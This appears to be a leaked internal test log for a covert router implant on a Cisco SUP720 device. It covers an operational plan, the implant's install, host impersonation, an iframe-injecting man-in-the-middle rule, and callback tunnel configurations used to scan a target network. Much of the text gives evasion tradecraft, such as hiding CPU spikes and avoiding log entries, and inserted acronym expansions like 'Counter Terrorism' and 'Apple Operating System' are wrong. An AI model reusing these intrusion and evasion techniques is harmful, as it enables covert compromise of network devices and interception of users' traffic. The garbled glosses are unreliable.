@@ -1,0 +1,450 @@
+
+                        Owner: User #71467
+Cytolysis-1h HG v3.1.6 Delivery
+HG v3.1.6 was delivered for Cytolysis on 1/12/16 for SUP720.  Testing scope will include ACE, SMITE and Tunnel.
+CONOP will be:
+
+Hop through 3 flux nodes - 1 internet, 1 osmo subnet, 1 admin mgmt subnet - and IACInternational Access Code attack VLANVirtual Local Area Network 1 IP of target - XXX.XXX.X.XXX (TOPWAY-NET[CN])
+
+Trigger port will be UDPUser Datagram Protocol 161, host to impersonate will be explicitly set to a host not on VLANVirtual Local Area Network 10 or VLANVirtual Local Area Network 2
+Establish CTCounter Terrorism session over HTTPSHypertext Transfer Protocol Secure back through flux node 4
+Use ACEApplication Control Engine (Module) commands to verify state of the device
+Use socket get_arp_survey_data and output of "show ip nat trans" to survey traffic from VLANVirtual Local Area Network 19
+SMITE hosts on target customer network - VLANVirtual Local Area Network 19
+Use Tunnel to appear as if Operator is on VLANVirtual Local Area Network other than VLANVirtual Local Area Network 19 or VLANVirtual Local Area Network 2, and from there, nmap VLANVirtual Local Area Network 19.
+
+Testing Summary
+
+Note in test report that module 2 is in state PwrDown and should be verified before proceeding
+We will trigger to IP of device on port UDPUser Datagram Protocol 161.  If trigger packets have incorrect sequence number, an encoding error will increment as shown in output of "show snmp".
+Comms packets are SSLv3 - need to consider if this is noticeable on this network
+Hardware difference between test device and target - daughter card on 4 port 10G line card.  This hardware difference has been accepted.
+5 sec CPU spikes to 45-65% during IACInternational Access Code attack, spike to 27% during HG install
+HG Consumes ~3.5M of Memory, visible in output out show mem
+Operator must manually start CovertTunnel module to use the tunnel capability
+Assists cause observeable in ouput of show ip cef <IP> - this is a known issue.
+Tunnel - Given the sensitivity to sending trigger packets with incorrect sequence number on this op, recommend using tun init to establish CovertTunnel instead of trigger.
+Tunnel - When running nmap or otherwise targeting VLANVirtual Local Area Network 19 from TAPVirtual Network kernel device IP, EXCLUDE 10.11.0.1 (VLANVirtual Local Area Network 19 interface IP) as this will result in acl denied log prints to console for this traffic.
+HG-13 created for mitm status showing inaccurate Active Sessions.
+HG-14 created for CovertTunnel drops when impersonated host NIC is bounced and host is Windows.
+SMITE adds about 1% to CPU, Tunnel running nmap adds about 2%.  Could vary depending if CTCounter Terrorism impersonated host becomes active on network, User #? impersonated host becomes active on the network, amount of traffic matched by SMITE rule, amount of traffic pushed through the tunnel.
+HG will work in an environment up to 4500ms of latency.
+
+Testing Notes
+
+
+Install -Memory at start of test: cytolysis-1#show mem Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)Processor 453ACAF0 381990160 101796608 280193552 276504440 218810732 I/O 8000000 67108864 13902404 53206460 53130184 53130428
+-attacked with IACInternational Access Code via flux -CPU hit a peak of 56% during IACInternational Access Code attack -Uploaded HG - show mem after install cytolysis-1#show mem Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)Processor 453ACAF0 381990160 105273148 276717012 275964416 216779752 I/O 8000000 67108864 13902404 53206460 53130184 53130428
+CPU hit one peak of 15% during install Used an interpacket delay of .1 for remote -Seeds traffic has been running -Established CTCounter Terrorism session impersonating XXX.XXX.X.XX (TOPWAY-NET[CN]) -success! confirmed that XXX.XXX.X.XX (TOPWAY-NET[CN]) can still browse [XXX.XXX.X.XX (TOPWAY-NET[CN])]> packet get_assist_threshold_status [Success]  Maximum Packets Per Second: 1500  Number of Packets Counted Per Sample: 3000  Highest Observed Packets Per Second: 173 Number of Overflows Since Settings Last Changed: 0  Time of Last Overflow: -- ************ Success ************[packet get_assist_threshold_status] -no log messages or snmp traps observed, cpu normal *will want to impersonate a host that is not very busy, since an assist will be laid down for that host cytolysis-1#show ip cef XXX.XXX.X.XX (TOPWAY-NET[CN])XXX.XXX.X.XX (TOPWAY-NET[CN])/32 receivecytolysis-1# -Quit the CTCounter Terrorism session and confirmed that after about 10 seconds, the RAA dropped: cytolysis-1#show ip cef XXX.XXX.X.XX (TOPWAY-NET[CN])XXX.XXX.X.XX (TOPWAY-NET[CN])/32 attached to Vlan3cytolysis-1#
+
+Uninstall-Re-established CTCounter Terrorism session, this time impersonating XXX.XXX.X.XX (TOPWAY-NET[CN]). No seeds currently running on that host. -Entered device uninstall-hg -mp -f to uninstall HG -no syslog or snmp trap observed -CPU from device after uninstall cytolysis-1# show proc cpu hist
+ 22222 44444 1111144444100 90 80 70 60 50 40 30 20 10 0....5....1....1....2....2....3....3....4....4....5....5.... 0 5 0 5 0 5 0 5 0 5 CPU% per second (last 60 seconds)
+1 1 1 1 1 1 1 0565955565466568566596566691570777976644965686666586545555100 90 80 70 60 50 40 30 20 * * * 10 ************************************** ************* **** 0....5....1....1....2....2....3....3....4....4....5....5.... 0 5 0 5 0 5 0 5 0 5 CPU% per minute (last 60 minutes) * = maximum CPU% # = average CPU%
+521121211212212111212222211242112111211112122 606719379081263898081510099121890987289981916100 90 80 70 60 * 50 * 40 * * 30 * * * * 20 ********************************************* 10 ********************************************* 0....5....1....1....2....2....3....3....4....4....5....5....6....6....7. 0 5 0 5 0 5 0 5 0 5 0 5 0 CPU% per hour (last 72 hours) * = maximum CPU% # = average CPU%
+cytolysis-1#cytolysis-1#show mem Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)Processor 453ACAF0 381990160 101863176 280126984 275964416 218810732 I/O 8000000 67108864 13902404 53206460 53130184 53130428 RAA for impsonated host from CTCounter Terrorism session has droppedcytolysis-1#show ip cef XXX.XXX.X.XX (TOPWAY-NET[CN])XXX.XXX.X.XX (TOPWAY-NET[CN])/32 attached to Vlan3cytolysis-1#
+
+
+Modularity
+-Reloaded DUTDevice Under Test to start with a clean device -Flux nodes up, Seeds running on VLANVirtual Local Area Network 19 -IAC attacked and uploaded HG -Established CTCounter Terrorism connection with XXX.XXX.X.XX (TOPWAY-NET[CN]) as impersonated host, no punch-throughs of traffic to impersonated host -Confirmed that impersonated host is still able to browse, did not observe any syslogs or traps sent by DUT -Stop/Start/Restarted ACEApplication Control Engine (Module) module - verified functionality after each start -Testing FB modularity and functionality with smite. Started up Victim3 VMVirtual Machine and web browsed with no rules active and saw the following print:Jan 19 19:03:08.193 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(80) (Vlan2 0015.fa80.efbf) -> 10.11.0.13(2213), 1 packetC - Added a rule for SMITE and saw the following cytolysis-1#show ip cef 10.11.0.1310.11.0.13/32 attached to Vlan19cytolysis-1#Jan 19 19:09:02.877 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(80) (Vlan2 0015.fa80.efbf) -> 10.11.0.13(2213), 6 packets -successfully SMITE'd 3 more times with no prints -restarting FB -no rules active, browsed from victim, cleared cache and went to all 3 web servers 10x, no prints  -activated SMITE rule and ran 7 times - then saw the following prints:
+Jan 19 20:02:55.049 C6506: %SEC-6-IPACCESSLOGP: list Customer-2-filter-in denied tcp XXX.XXX.X.XX (TOPWAY-NET[CN])(1041) (Vlan19 0050.5688.c5e6) -> X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777), 1 packetJan 19 20:08:04.769 C6506: %SEC-6-IPACCESSLOGP: list Customer-2-filter-in denied tcp XXX.XXX.X.XX (TOPWAY-NET[CN])(1041) (Vlan19 0050.5688.c5e6) -> X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777), 7 packetsJan 19 20:09:04.801 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied udp 10.9.8.22(137) (Vlan2 0021.d80d.cfc1) -> XXX.XXX.X.XX (TOPWAY-NET[CN])(137), 3 packetsJan 19 20:13:04.929 C6506: %SEC-6-IPACCESSLOGP: list Customer-2-filter-in denied tcp XXX.XXX.X.XX (TOPWAY-NET[CN])(1041) (Vlan19 0050.5688.c5e6) -> X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777), 2 packetsJan 19 20:18:05.093 C6506: %SEC-6-IPACCESSLOGP: list Customer-2-filter-in denied tcp XXX.XXX.X.XX (TOPWAY-NET[CN])(1041) (Vlan19 0050.5688.c5e6) -> X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777), 3 packetsC
+
+Testing SMITE
+Starting over with Debian 8.2.  Installed ICON on TR, setup flux, cleaned DUT
+Restarted Victim 3 - web browsed 15 times to all three web servers and observed no prints
+Web browsed directly to iframe url 15 times and observed no prints
+Attacked with IACInternational Access Code and uploaded HG from new ICON 8.2 VMVirtual Machine - impersonating XXX.XXX.X.XX (TOPWAY-NET[CN])
+
+Restarted victim 3.  web browsed 15 times to all three web servers - no prints observed
+Web browsed directly to iframe url 15 times in a row - after the 10th try, observed the following:cytolysis-1#Jan 20 00:39:05.284 C6506: %SEC-6-IPACCESSLOGP: list Customer-2-filter-in denied tcp XXX.XXX.X.XX (TOPWAY-NET[CN])(1132) (Vlan19 0050.5688.c5e6) -> X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777), 1 packet
+
+cytolysis-1#show access-list Customer-2-filter-inExtended IP access list Customer-2-filter-in 10 permit tcp 10.11.0.0 0.0.0.255 host XXX.XXX.X.XX (TOPWAY-NET[CN]) eq 123 20 permit udp 10.11.0.0 0.0.0.255 host XXX.XXX.X.XX (TOPWAY-NET[CN]) eq ntp 30 permit icmp any host 10.11.0.1 (5870 matches) 40 deny ip any 10.11.0.0 0.0.0.255 log-input 50 permit icmp any host XXX.XXX.X.XX (TOPWAY-NET[CN]) 60 permit icmp any host XXX.XXX.X.XXX (TOPWAY-NET[CN]) 70 permit icmp any host XXX.XXX.X.XX (TOPWAY-NET[CN]) 80 permit icmp any host XXX.XXX.X.XXX (TOPWAY-NET[CN]) 90 deny ip any host XXX.XXX.X.XX (TOPWAY-NET[CN]) log-input 100 deny ip any XXX.XXX.X.XX (TOPWAY-NET[CN]) 0.0.0.31 log-input 110 deny ip any host XXX.XXX.X.XX (TOPWAY-NET[CN]) log-input 120 deny ip any host XXX.XXX.X.XXX (TOPWAY-NET[CN]) log-input 130 permit tcp 10.11.0.0 0.0.0.255 any eq smtp log-input 140 permit tcp 10.11.0.0 0.0.0.255 any eq 135 log-input 150 permit tcp 10.11.0.0 0.0.0.255 any eq 137 log-input 160 permit tcp 10.11.0.0 0.0.0.255 any eq 139 log-input 170 permit ip 10.11.0.0 0.0.0.255 any (22022 matches) 180 deny ip any any log-input (1 match)cytolysis-1#
+
+
+Characterization of print observed while browsing to windex server
+Collecting VLANVirtual Local Area Network 19 packet capture during print message
+set logging interval and threshold on DUTDevice Under Test so that logs will be seen immediately
+Set up span port for vlan 2 and vlan 19 on DUTDevice Under Test and collecting on the DC from g1/1
+Stopped the seeds traffic from cust2 to minimize output in wireshark
+Ran manual browses from target client to iframe url - took about ten tries, but I got the print and saved off the information that xetron had requested.
+Wiping HG, reload DUT, reload target.  Going to confirm once more that I really never get this print without HG by trying more times.
+Performed 30 browses to iframe url and no print.  Also browsed at least 30 times to other three web servers, no print
+Added HG, still no seeds, no CTCounter Terrorism session.  Repeating step g.  Observed print on the 24th iteration:Jan 22 00:22:01.499 C6506: %SEC-6-IPACCESSLOGP: list Customer-2-filter-in denied tcp XXX.XXX.X.XX (TOPWAY-NET[CN])(1262) (Vlan19 0050.5688.c5e6) -> X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777), 1 packet
+
+Going to see if this occurs more during SMITE rule
+Established CTCounter Terrorism session and created smite rule:mitm create http_iframe 10.11.0.13 255.255.255.255 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.255 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -bk -bc -en
+
+Observed prints with SMITE rule active as well at about the same rate
+Uninstalled and rebooted DUT
+Installed original version of delivery 3.1.5.
+Also working in installing newest version of windex in TR
+Was able to browse to iframe url 30 times from client wiht v3.1.5 and saw no prints.  however overnight, i had left the browser window open and windex session connected and at 4am, the router did log some messages:
+Jan 22 04:42:37.120 C6506: %SEC-6-IPACCESSLOGP: list Customer-2-filter-in denied tcp XXX.XXX.X.XX (TOPWAY-NET[CN])(1122) (Vlan19 0050.5688.c5e6) -> X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777), 1 packetJan 22 04:42:37.120 C6506: %SEC-6-IPACCESSLOGP: list Customer-2-filter-in denied tcp XXX.XXX.X.XX (TOPWAY-NET[CN])(1122) (Vlan19 0050.5688.c5e6) -> X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777), 1 packetJan 22 04:42:50.120 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied udp 10.9.8.22(137) (Vlan2 0021.d80d.cfc1) -> XXX.XXX.X.XX (TOPWAY-NET[CN])(137), 1 packetJan 22 04:42:51.636 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied udp 10.9.8.22(137) (Vlan2 0021.d80d.cfc1) -> XXX.XXX.X.XX (TOPWAY-NET[CN])(137), 1 packet
+After attempting another 30 times without HG, I did reproduce the error message without HG.  This may just be a Windex/IOS NATNetwork Address Translation issue.  Hopefully this issue will be resolved in the newer version of Windex.
+
+
+Testing Modularity
+Reloaded DUT
+CPU spike to 66% during IACInternational Access Code attack, 27% duing IACInternational Access Code install, 11% duing CTCounter Terrorism session establishment
+Already tested FB and ACEApplication Control Engine (Module) in previous test 3
+Testing Tunnel - Note that Tunnel module is not started by default.  Operator will have to start Tunnel module with "module start CovertTunnel.mod" command
+Started tunnel mod.  Then stopped it with module stop Tunnel.  Repeated three more times.
+Was unable to restart it at first, but after enough time passed and i entered ilm refresh, it did restart successfully.  no syslogs or traps observed, no impact to CPU.
+
+
+HTTPS Comms testingTesting the functionality of impersonating different hosts
+impersonated XXX.XXX.X.XX (TOPWAY-NET[CN]) - successful connection.  RAA laid down.  Confirmed that host is still able to browse.  No syslogs or traps.
+Exited that session and impersonated another host - XXX.XXX.X.XX (TOPWAY-NET[CN]) - this IP is on the VLANVirtual Local Area Network interface - vlan 3 for customer 1.  Successfully connected, rx adj in place for .81, however it is always in place.  Can ping from router to 1.1.1.1 with source address of XXX.XXX.X.XX (TOPWAY-NET[CN]).  Packet assist threshold not increasing with small amount of traffic.
+Collected wireshark of HTTPSHypertext Transfer Protocol Secure comms establishment
+Tested impersonation of a host on a different vlan - tried vlan 2 10.11.0.10 although this is not recommeded - cx successful and was still able to browse from 10.11.0.10.  Observed these prints thoughJan 29 00:48:33.410 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp 100.100.40.3(80) (Vlan2 0021.d80d.cfc1) -> 10.11.0.10(36901), 1 packetJan 29 00:48:34.410 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp 100.100.40.3(80) (Vlan2 0021.d80d.cfc1) -> 10.11.0.10(36901), 1 packet
+
+Tested XXX.XXX.X.XX (TOPWAY-NET[CN]) - a non existent host - cx successful as long as the IP was routed back to the device through the network properly
+No prints or traps observed duirng cx
+Tested connecting impersonating host on vlan 48 - success - still able to browse from impersonated host, no logs or traps.  Assist was laid down and then dropped when CTCounter Terrorism was disconnected.
+Testing sending wrong trigger sequence - current seq is 21
+Set to 18 and impersonated XXX.XXX.X.XX (TOPWAY-NET[CN]) while running wireshark on impersonated host
+Impersonated host saw no traffic, no logs, traps were sent by DUT. As expected, encoding errors incremented on output of show snmp.
+Enabled snmp packet debugging and tested with wrong seq number again - router reports:Jan 29 02:18:55.885 C6506: SNMP: Packet received via UDPUser Datagram Protocol from XXX.XXX.X.XX (TOPWAY-NET[CN]) on Vlan1
+Router does not see the snmp packet in debug output if sequence number is correct.
+
+
+
+
+
+Testing socket get arp survey
+Ran command to view arp survey data[XXX.XXX.X.XX (TOPWAY-NET[CN])]> socket get_arp_survey_data [Success]  Vlan: 0 Sender Protocol Address Sender Hardware Address Target Protocol Address Time Last Updated  10.11.0.10 00:50:56:88:5e:52 10.11.0.1 2016-01-28T22:23:29Z  XXX.XXX.X.XX (TOPWAY-NET[CN]) 00:50:56:88:3c:e4 XXX.XXX.X.XX (TOPWAY-NET[CN]) 2016-01-28T22:11:58Z  XXX.XXX.XX.XXX (TOPWAY-NET[CN]) 00:50:56:88:b0:96 XXX.XXX.XX.XXX (TOPWAY-NET[CN]) 2016-01-28T22:02:57Z ************ Success ************[socket get_arp_survey_data]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+
+Cleared arp survey data and then checked again
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> socket get_arp_survey_data [Success]  Vlan: 0 Sender Protocol Address Sender Hardware Address Target Protocol Address Time Last Updated  10.11.0.10 00:50:56:88:5e:52 10.11.0.1 2016-01-28T22:24:09Z ************ Success ************[socket get_arp_survey_data]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+Ran IXIA traffic and checked again[XXX.XXX.X.XX (TOPWAY-NET[CN])]> socket get_arp_survey_data [Success]  Vlan: 0 Sender Protocol Address Sender Hardware Address Target Protocol Address Time Last Updated  10.11.0.10 00:50:56:88:5e:52 10.11.0.1 2016-01-28T22:43:43Z  10.11.0.59 02:1a:c5:05:00:1b 10.11.0.1 2016-01-28T22:36:58Z  XXX.XXX.X.XX (TOPWAY-NET[CN]) 00:50:56:88:e1:dd XXX.XXX.X.XX (TOPWAY-NET[CN]) 2016-01-28T22:36:58Z  XXX.XXX.X.XX (TOPWAY-NET[CN]) 02:1a:c5:04:00:16 XXX.XXX.X.XX (TOPWAY-NET[CN]) 2016-01-28T22:36:58Z  10.11.0.51 02:1a:c5:05:00:13 10.11.0.1 2016-01-28T22:32:00Z  XXX.XXX.X.XX (TOPWAY-NET[CN]) 02:1a:c5:04:00:18 XXX.XXX.X.XX (TOPWAY-NET[CN]) 2016-01-28T22:32:00Z  XXX.XXX.XX.XXX (TOPWAY-NET[CN]) 00:50:56:88:b0:96 XXX.XXX.XX.XXX (TOPWAY-NET[CN]) 2016-01-28T22:24:44Z ************ Success ************[socket get_arp_survey_data]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+Not as many as I'd thought, however this delivery doesn't snoop.  Cleared and then viewed data while IXIA was running three times.
+
+
+Test of ACE
+Created over 25k NATNetwork Address Translation translations, IXIA traffic running in background.  DUT clean.  
+Stats before implantation: cytolysis-1#show proc cpuCPU utilization for five seconds: 1%/0%; one minute: 2%; five minutes: 3%
+ 
+cytolysis-1#show ip nat statTotal active translations: 23629 (0 static, 23629 dynamic; 23629 extended)Outside interfaces: Vlan2Inside interfaces: Vlan19Hits: 498132 Misses: 0CEF Translated packets: 408030, CEF Punted packets: 333224Expired translations: 58242Dynamic mappings:-- Inside Source[Id: 1] access-list 19 pool Customer-2 refcount 23629 pool Customer-2: netmask 255.255.255.252 start XXX.XXX.X.XX (TOPWAY-NET[CN]) end XXX.XXX.X.XX (TOPWAY-NET[CN]) type generic, total addresses 1, allocated 1 (100%), misses 0longest chain in pool: Customer-2's addr-hash: 1, average len 0,chains 1/256cytolysis-1#
+cytolysis-1#show mem Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)Processor 453A9990 382002800 146287016 235715784 223944216 185187724
+
+IAC attack - cpu spike to 45%.  Uploaded HG - CPU spike to 22%.
+Established CTCounter Terrorism session, impersonated host XXX.XXX.XX.XXX (TOPWAY-NET[CN]).
+Executed all of the commands listed as planned for use on CONOPConcealed Operation confluence page.
+No traps observed. show ip nat trans with 25k translations showed a spike in 5 second CPU.  This could be masked by briefly enabling cpu scaling.
+Tested enabled cpu scaling for bounds of 10 and 20.  Spike was successfully suppressed in show proc cpu hist.
+Performing show commands with ? mark returns the options for completing the command as well as the output from hitting return after the command
+Ran a show tech through ace and it worked just fine - 5 sec CPU spiked to 66%.
+
+
+Tunnel Test
+Hard reset device - then loaded HG on.
+Established CTCounter Terrorism session impersonating XXX.XXX.X.XX (TOPWAY-NET[CN]) and then set up a Tunnel with TAPVirtual Network kernel device IP XXX.XXX.XX.XXX (TOPWAY-NET[CN]).
+Started CovertTunnel.mod
+Modified callback and endpoint files.  Endpoint file set to listen on fw0, left seq at 0, use port 443 for HTTPSHypertext Transfer Protocol Secure comms.  Callback file set to use TAPVirtual Network kernel device IP:TapIPAddr = XXX.XXX.XX.XXX (TOPWAY-NET[CN])TapSubnet = 255.255.255.248TapMACAddr = 00:01:44:27:78:3aTimeout = 0AllowARP = 1Protocol = CommsHVLAN = 48
+
+
+and callback to:
+[OpenSession_HTTPS]Remote = XXX.XXX.X.X (QWEST-INET-6[US])Port = 443Critical = 0
+
+and impersonate:[IParams]IPAddress = XXX.XXX.X.XX (TOPWAY-NET[CN])SubnetMask = 255.255.255.240MACAddress = 00:1d:71:1f:88:7eTTL = 64VLAN = 3
+
+Initiated callback from CTCounter Terrorism session:[XXX.XXX.X.XX (TOPWAY-NET[CN])]> tun init tools/User #?/config/User #?-callback.ini [Pending] Job: 136282824************ Pending ************[tun init tools/User #?/config/User #?-callback.ini]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> [Success] Job: 136282824************ Success ************
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+
+Tunnel successfully established:
+Listening for clients on port 443...Accepted connection from XXX.XXX.X.XX (TOPWAY-NET[CN]):8729Attempting SSLSecure Socket Layer Handshake...SSL Handshake Successful!Throttling tunnel connection with the parameters: Outbound Average Rate: 100 packets/sec Outbound Peak Burst Rate: 200 packets/secPerforming key exchange with the tunnel endpoint...Successfully performed key exchange with the tunnel endpoint!Connected with device UID: 001121b9fbb8Opened the TAPVirtual Network kernel device interface tap0Setting the tap0 interface status to down
+tap0 Interface Parameters: IP Address: XXX.XXX.XX.XXX (TOPWAY-NET[CN]) Subnet Mask: 255.255.255.248 MACApple Operating System Address: 00-01-44-27-78-3a
+Setting the tap0 interface status to upTunnel is now active
+
+TAP interface now active on ICON:tap0 Link encap:Ethernet HWaddr 00:01:44:27:78:3a  inet addr:XXX.XXX.XX.XXX (TOPWAY-NET[CN]) Bcast:XXX.XXX.XX.XXX (TOPWAY-NET[CN]) Mask:255.255.255.248 UP BROADCAST RUNNING MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:500  RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)
+
+Added route for network I want to reach:
+root@debian:/home/user1/ops/cytolysis/cytolysis-1h/hg/tools/User #?/config# route add -net 10.11.0.0/24 dev tap0root@debian:/home/user1/ops/cytolysis/cytolysis-1h/hg/tools/User #?/config# route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface0.0.0.0 172.20.12.1 0.0.0.0 UG 0 0 0 eth010.11.0.0 0.0.0.0 255.255.255.0 U 0 0 0 tap0XXX.XXX.X.X (TOPWAY-NET[CN]) 192.168.88.1 255.255.0.0 UG 0 0 0 fw0XXX.XXX.X.XX (TOPWAY-NET[CN]) 192.168.88.1 255.255.255.255 UGH 0 0 0 fw0XXX.XXX.X.XX (TOPWAY-NET[CN]) 192.168.88.1 255.255.255.255 UGH 0 0 0 fw0XXX.XXX.XX.XXX (TOPWAY-NET[CN]) 0.0.0.0 255.255.255.248 U 0 0 0 tap0172.20.12.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0192.168.88.1 0.0.0.0 255.255.255.255 UH 0 0 0 fw0root@debian:/home/user1/ops/cytolysis/cytolysis-1h/hg/tools/User #?/config#
+Attempted to nmap hosts on 10.11.0.0/24 network but was not able to.  I was able to successfully ping and ssh into hosts on that subnet.  While watching traffic with wireshark on both the ICON and Target vm, i saw that when nmap runs, wireshark shows two arp requests for who has 10.11.0.10 and then shows duplicate MACApple Operating System address in use for XXX.XXX.XX.XXX (TOPWAY-NET[CN]) (TAPVirtual Network kernel device IP).  The two MACs reported are the TAPVirtual Network kernel device IP MACApple Operating System as well as the MACApple Operating System of interface vlan 2 and IP XXX.XXX.X.XX (TOPWAY-NET[CN]) on the DUT.
+Tried making my flux routes more specific so that the routes wouldn't overlap with TAPVirtual Network kernel device routes - did not fix issue.
+Closed tunnel, changed callback.ini file Allow ARPAddress Resolution Protocol variable to 0 and then re-initiated tunnel.  This did fix the issue.  oot@debian:/home/user1/ops/cytolysis/cytolysis-1h/hg/tools/User #?/config# nmap -Pnv 10.11.0.10
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-01-31 17:45 UTCNmap scan report for 10.11.0.10Host is up (0.26s latency).Not shown: 999 closed portsPORT STATE SERVICE22/tcp open sshMAC Address: AA:BB:CC:DD:EE:FF (Unknown)
+Nmap done: 1 IP address (1 host up) scanned in 30.07 secondsroot@debian:/home/user1/ops/cytolysis/cytolysis-1h/hg/tools/User #?/config#
+
+No prints were observed on console of router throughout.
+Still able to ssh and ping host as well.  Attempting a more extensive nmap...
+Getting prints on nmap traffic to VLANVirtual Local Area Network 2 IP address 10.11.0.1.  Need to repeat and exclude that IP.
+Example of print to .1Jan 31 22:42:33.743 C6506: %SEC-6-IPACCESSLOGP: list Customer-2-filter-in denied tcp XXX.XXX.XX.XXX (TOPWAY-NET[CN])(46097) (Vlan19 0019.a993.3440) -> 10.11.0.1(2038), 1 packet
+
+Do not see that print as long as that IP is excluded.  Nmaps generate a lot of ARPAddress Resolution Protocol traffic for non-existent hosts on the network, seen on wireshark running on an existing host.
+Testing what happens when TAPVirtual Network kernel device IP becomes active on the network.  Changed the IP of XXX.XX.XX.XXX (CMNET[CN]) to XXX.XX.XX.XXX (CMNET[CN]) - Tunnel closed immediately:Tunnel is now activeShutting down tunnel: Client became active on the network
+Closing User #?Closed the TAPVirtual Network kernel device interface tap0
+
+No prints observed.  Changed IP back to .130 and then re-established the tunnel with tap ip .131
+Repeated the tunnel dropping due to TAPVirtual Network kernel device ip active on the network while nmap scan was running... resulted in prints to console because ICON box (1918 space) is now routing nmap traffic directly to the DUTDevice Under Test instead of going through tunnel, and this traffic is denied by acl:Jan 31 23:21:27.719 C6506: %SEC-6-IPACCESSLOGDP: list Core-Net-filter-in denied icmp 172.20.12.1 (Vlan2 0021.d80d.cfc1) -> XXX.XXX.XX.XXX (TOPWAY-NET[CN]) (3/1), 1 packet
+
+No other prints observed, no traps observed.  CPU impact - 5 second spikes to 16% during tunnel establishment.  After that CPU remains low.
+Testing CTCounter Terrorism tunnel show commands:[XXX.XXX.X.XX (TOPWAY-NET[CN])]> tun show[Success] Tunnel Sessions  Session ID: TAPVirtual Network kernel device IP Address: Endpoint: State:  4 XXX.XXX.XX.XXX (TOPWAY-NET[CN]) XXX.XXX.X.X (QWEST-INET-6[US]):443 Running Tunnel Listeners  Listener ID: TAPVirtual Network kernel device IP Address: ************ Success ************[tun show]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> tun session 4[Success]  Session ID: 4  State: Running Allow ARPAddress Resolution Protocol Requests: No  Timeout: 0d 0h 0m 0s  Duration: 0d 20h 31m 3s  Time Left: 0d 0h 0m 0s  Time Until Init: --  TAPVirtual Network kernel device IP Address: XXX.XXX.XX.XXX (TOPWAY-NET[CN])  TAPVirtual Network kernel device MACApple Operating System Address: 00:01:44:27:78:3a  Endpoint Address: XXX.XXX.X.X (QWEST-INET-6[US]):443  Critical: No ************ Success ************[tun session 4]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+Closed and reinitated tunnel - SUCCESS
+Closed and reinitated tunnel with a 2s minute timeout value - tunnel closed after 2s
+Tunnel is now activeShutting down tunnel: Tunnel has timed out
+Initated tunnel with 2m timeout - ssh'd into .10 and waited 2 m - SUCCESS[XXX.XXX.X.XX (TOPWAY-NET[CN])]> tun session 7[Success]  Session ID: 7  State: Running Allow ARPAddress Resolution Protocol Requests: No  Timeout: 0d 0h 2m 0s  Duration: 0d 0h 1m 55s  Time Left: 0d 0h 0m 4s  Time Until Init: --  TAPVirtual Network kernel device IP Address: XXX.XXX.XX.XXX (TOPWAY-NET[CN])  TAPVirtual Network kernel device MACApple Operating System Address: 00:01:44:27:78:3a  Endpoint Address: XXX.XXX.X.X (QWEST-INET-6[US]):443  Critical: No ************ Success ************[tun session 7]
+
+
+Triggered a tunnel instead of using tun init
+
+changed the sequence number to 2 to match output from beacon get_current_trigger_seq
+
+root@debian:/home/user1/ops/cytolysis/cytolysis-1h/hg/tools/User #?/linux# ./User #? ../config/User #?-endpoint.ini -t ../config/User #?-callback.ini User #? Version 1.0.5Unable to open certificate file ./Cert.bin. Will build one...
+Listening for clients on port 443...Sending Trigger Packet... Trigger was successful!Accepted connection from XXX.XXX.X.XX (TOPWAY-NET[CN]):21193Attempting SSLSecure Socket Layer Handshake...SSL Handshake Successful!Throttling tunnel connection with the parameters: Outbound Average Rate: 100 packets/sec Outbound Peak Burst Rate: 200 packets/secPerforming key exchange with the tunnel endpoint...Successfully performed key exchange with the tunnel endpoint!Connected with device UID: 001121b9fbb8Opened the TAPVirtual Network kernel device interface tap0Setting the tap0 interface status to down
+tap0 Interface Parameters: IP Address: XXX.XXX.XX.XXX (TOPWAY-NET[CN]) Subnet Mask: 255.255.255.248 MACApple Operating System Address: 00-01-44-27-78-3a
+Setting the tap0 interface status to upTunnel is now activeShutting down tunnel: Tunnel has timed out
+Closing User #?Closed the TAPVirtual Network kernel device interface tap0root@debian:/home/user1/ops/cytolysis/cytolysis-1h/hg/tools/User #?/linux#
+
+Was able to ssh to client.  tunnel timed out as set.
+
+
+Collect wireshark of tunnel establishment and teardown
+Test abnormal tunnel termination
+Established tunnel
+On ICON, ifconfig tap0 down
+ifconfig no longer shows tap0 interface
+tunnel is still up according to User #? and drillbit
+Tunnel eventually timed out due to timeout setting in .ini file
